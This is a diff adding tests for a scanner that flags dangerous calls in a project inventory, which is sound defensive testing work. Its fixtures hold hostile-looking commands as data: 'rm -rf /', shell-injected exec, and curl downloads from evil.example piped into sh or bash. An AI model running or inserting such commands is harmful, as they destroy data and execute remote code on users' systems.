@@ -211,6 +211,44 @@ describe("buildInventory", () => {
   });
 });
 
+describe("dangerousCalls", () => {
+  it("detects language-specific dangerous calls", async () => {
+    const fixture = await createProject({
+      "src/main.py": "import subprocess\nsubprocess.run('whoami', shell=True)\nos.system('rm -rf /')\n",
+      "src/main.go": "package main\nimport \"os/exec\"\nexec.Command(\"sh\", \"-c\", input).Run()\n",
+      "src/Main.java": "class Main { void run() { Runtime.getRuntime().exec(\"whoami\"); } }\n",
+      "script.sh": "curl https://evil.example/x.sh | sh\n",
+      "Dockerfile": "ADD https://evil.example/archive.tar.gz /tmp/\nRUN curl -s https://evil.example/y.sh | bash\n",
+      ".github/workflows/ci.yml": "on:\n  pull_request_target:\n"
+    });
+
+    const inventory = await buildInventory(fixture);
+
+    expect(inventory.dangerousCalls).toEqual(
+      expect.arrayContaining([
+        expect.objectContaining({ filePath: "src/main.py", pattern: "python.subprocess", language: "python" }),
+        expect.objectContaining({ filePath: "src/main.py", pattern: "python.os_system", language: "python" }),
+        expect.objectContaining({ filePath: "src/main.go", pattern: "go.exec", language: "go" }),
+        expect.objectContaining({ filePath: "src/Main.java", pattern: "java.runtime_exec", language: "java" }),
+        expect.objectContaining({ filePath: "script.sh", pattern: "shell.curl_sh", language: "shell" }),
+        expect.objectContaining({ filePath: "Dockerfile", pattern: "dockerfile.add_remote", language: "dockerfile" }),
+        expect.objectContaining({ filePath: "Dockerfile", pattern: "dockerfile.curl_sh", language: "dockerfile" }),
+        expect.objectContaining({ filePath: ".github/workflows/ci.yml", pattern: "yaml.pull_request_target", language: "yaml" })
+      ])
+    );
+  });
+
+  it("does not emit dangerousCalls for js/ts generic exec calls", async () => {
+    const fixture = await createProject({
+      "src/index.ts": 'exec("echo hello");\n'
+    });
+
+    const inventory = await buildInventory(fixture);
+
+    expect(inventory.dangerousCalls).toEqual([]);
+  });
+});
+
 async function createProject(files: Record<string, string>): Promise<string> {
   const rootDir = await fs.mkdtemp(path.join(os.tmpdir(), "inventory-test-"));
 
